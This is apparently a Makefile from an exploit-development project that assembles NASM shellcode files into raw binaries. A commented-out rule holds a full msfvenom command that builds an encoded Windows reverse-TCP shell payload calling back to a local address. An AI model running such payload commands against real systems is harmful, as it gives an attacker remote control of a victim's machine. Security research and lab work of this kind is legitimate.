SHELLCODE_SRC = $(wildcard shellcode/*.nasm)
SHELLCODE_BIN = $(SHELLCODE_SRC:.nasm=.bin)

all: $(SHELLCODE_BIN)

shellcode/%.bin: shellcode/%.nasm
	nasm -o $@ -f bin $<

#shellcode/reverse_tcp.alnum.bin:
#	msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.2 LPORT=8090 -e x86/alpha_mixed BufferRegister=ECX -f raw > $@

clean:
	rm -f $(SHELLCODE_BIN)